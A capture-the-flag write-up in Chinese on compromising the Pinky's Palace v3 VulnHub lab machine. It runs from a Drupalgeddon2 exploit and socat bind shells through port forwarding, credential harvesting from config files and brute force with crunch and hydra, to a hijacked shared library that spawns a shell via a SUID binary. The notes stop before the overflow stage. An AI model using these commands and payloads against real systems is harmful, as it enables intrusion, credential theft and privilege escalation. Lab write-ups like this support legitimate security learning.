# Pinky's Palace: v3

2024-7-10 https://www.vulnhub.com/entry/pinkys-palace-v3,237/

difficulty: begginer-intermediate

## IP

192.168.5.37

## Scan

Open Port -> 21,5555,8000

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             173 May 14  2018 WELCOME
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.5.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5555/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 80526ebdb0c4be0af21d3bacb8474fee (RSA)
|   256 ebc876a4cf376f0d5ff548af5c2992d9 (ECDSA)
|_  256 482b84023e877b2af39111310f9811c7 (ED25519)
8000/tcp open  http    nginx 1.10.3
|_http-title: PinkDrup
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: nginx/1.10.3
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
```

先看 ftp 可匿名登陆，WELCOME 提示信息:

```
Welcome to Pinky's Palace V3

Good Luck ;}

I encourage you to be creative, try and stay away from metasploit and pre-made tools.
You will learn much more this way!

~Pinky
```

另外发现了一个 ... 的隐藏文件夹，里面有一个 .bak 文件夹，firewall.sh 下载下来看看什么内容:

```
iptables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
ip6tables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
```

发现防火墙对出网的链接限制，可能影响后续的反弹 shell.

转战 8000 端口，CMS 为 Drupal，http://192.168.5.37:8000/CHANGELOG.txt 发现版本为 7.57 尝试使用了 msf 中的 drupal_drupalgeddon2 进行利用, 验证了存在漏洞，但是反弹没有成功，可能与上面的防火墙规则有关系，不出网。尝试用 payload/generic/shell_bind_tcp , 重新执行后得到了 web shell。

进入 shell 后，先找到 CMS 的数据库配置文件 ./sites/default/settings.php :

```
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'dpink',
      'password' => 'drupink',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

同时发现几个可用用户:

```
cat /etc/passwd | grep '/bin/bash'

root:x:0:0:root:/root:/bin/bash
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
pinksec:x:1001:1001::/home/pinksec:/bin/bash
pinksecmanagement:x:1002:1002::/home/pinksecmanagement:/bin/bash
```

尝试用得到的数据库密码进行喷射 ssh，没有匹配的。

继续进入数据库找到 users 表中的用户名和密码，但是没有找到这个哈希的明文密码。

```
echo 'use drupal;select * from users;' | mysql -udpink -pdrupink

pinkadmin	$S$DDLlBhU7uSuGiPBv1gqEL1QDM1G2Nf3SQOXQ6TT7zsAE3IBZAgup
```

当前在 msf 中的 shell 不好用，看看目标机器上有没有 nc 或者 socat 之类的客户端，发现有 socat，于是在目标机器上建立监听，kali 去正向连接：

```
# 目标机器上执行
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:8888

# kali上执行
socat file:`tty`,raw,echo=0 tcp:192.168.5.37:8888
```

继续进行系统枚举，发现隐藏在本机的特殊端口 netstat -tnlup -> 127.0.0.1:80 , 同时发现 pinksec 用户运行了 apache:

```
www-data@pinkys-palace:/etc/apache2$ cat ports.conf

Listen 127.0.0.1:80
Listen 127.0.0.1:65334
<IfModule ssl_module>
	Listen 443
</IfModule>

<IfModule mod_gnutls.c>
	Listen 443
</IfModule>
```

证明本地 80 端口是 pinksec 启动的，同时发现了 apache 的相关配置文件：

```
ww-data@pinkys-palace:/etc/apache2$ cat ./sites-available/000-default.conf

<VirtualHost 127.0.0.1:80>
	DocumentRoot /home/pinksec/html
	<Directory "/home/pinksec/html">
	Order allow,deny
	Allow from all
	Require all granted
	</Directory>
</VirtualHost>
<VirtualHost 127.0.0.1:65334>
	DocumentRoot /home/pinksec/database
	<Directory "/home/pinksec/database">
	Order allow,deny
	Allow from all
	Require all granted
	</Directory>
</VirtualHost>
```

2 个端口分别映射到了 pinksec 用户目录的文件夹内。

需要进行端口转发，才能访问这 2 个本地监听端口。

```
socat TCP-LISTEN:5001,reuseaddr,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:5002,reuseaddr,fork TCP:127.0.0.1:65334 &
```

这时 5001 和 5002 端口已经对外开放。

http://192.168.5.37:5001/ 显示了一个登陆页面，尝试没有 SQL 注入。

http://192.168.5.37:5002/ 显示 DATABASE Under Development 显示数据库处于开发截断，可能存在问题。/home/pinksec/database 文件夹中很有可能有数据文件。爆破一下可能存在的文件

```
gobuster -t 32 dir -u http://192.168.5.37:5002/ -k -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -e -x txt,zip,rar,db
```

这里没找到，最终看了网上的解析，得到了确定的密码字典:

```
crunch 3 5 -f /usr/share/crunch/charset.lst lalpha -o pinkdbcrunsh.txt
```

再次爆破，得到了 pwds.db 文件,应该是一个密码字典:

```
FJ(J#J(R#J
JIOJoiejwo
JF()#)PJWEOFJ
Jewjfwej
jvmr9e
uje9fu
wjffkowko
ewufweju
pinkyspass
consoleadmin
administrator
admin
P1nK135Pass
AaPinkSecaAdmin4467
password4P1nky
Bbpinksecadmin9987
pinkysconsoleadmin
pinksec133754
```

```
root
pinky
pinksec
pinksecmanagement
pinkadmin
```

hydra -t 10 -L user -P pass ssh://192.168.5.37:5555 爆破没有找到可用凭据。尝试用此密码字典，然后用前面获得的用户名 hydra 爆破 5001 上的登陆，同时生成 5 位 pin 数字:

```
crunch 5 5 -f /usr/share/crunch/charset.lst numeric -o pin.txt
```

最终发现用户名和密码：user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=55849

http://192.168.5.37:5001/PinkysC0n7r0lP4n31337/index.php 发现一个命令执行的窗口，继续用 socat 创建监听：

```
# 目标机器上执行
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:9999

# kali上执行
socat file:`tty`,raw,echo=0 tcp:192.168.5.37:9999
```

连接后，发现了数据库配置文件:

```
pinksec@pinkys-palace:/home/pinksec/html$ cat config.php
<?php
$DB_USER = "psec";
$DB_PASS = "FJ#90)FJ#@j";
$DB_HOST = "localhost";
$DB_NAME = "pinksec";
?>
```

在这个用户 home 目录下，发现了一个可执行程序 /home/pinksec/bin/pinksecd 同时这个文件是个 suid 程序，它的所属者是 pinksecmanagement，看看能否提权到 pinksecmanagement 用户。

strings pinksecd 没有发现可以利用的的相对路径调用，看看动态链接库是否有可以利用的:

```
pinksec@pinkys-palace:/home/pinksec/bin$ ldd pinksecd
	linux-gate.so.1 (0xb7fd9000)
	libpinksec.so => /lib/libpinksec.so (0xb7fc9000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e12000)
	/lib/ld-linux.so.2 (0xb7fdb000)
```

发现 /lib/libpinksec.so 属性为 rwx，表明我们可以替换成自己的 so 文件，目标系统上有 gcc，制作 so 文件：

```
#include <stdlib.h>

int psbanner() {
    return system("/bin/sh");
}
int psopt() {
  return system("/bin/sh");
}
int psoptin() {
  return system("/bin/sh");
}

gcc -fPIC -shared -nostartfiles -o libpinksec.so shell.c
cp /lib/libpinksec.so libpinksec.so.bak
cp libpinksec.so /lib/libpinksec.so
```

这时在执行 pinksecd 得到了 pinksecmanagement 的用户权限。

以这个用户权限发现另外一个 suid 程序 /usr/local/bin/PSMCCLI 它的所属用户为 pinky，估计能使用此 suid 程序升级到 pinky 用户。

后面这里是二进制溢出，暂时先放这里.....
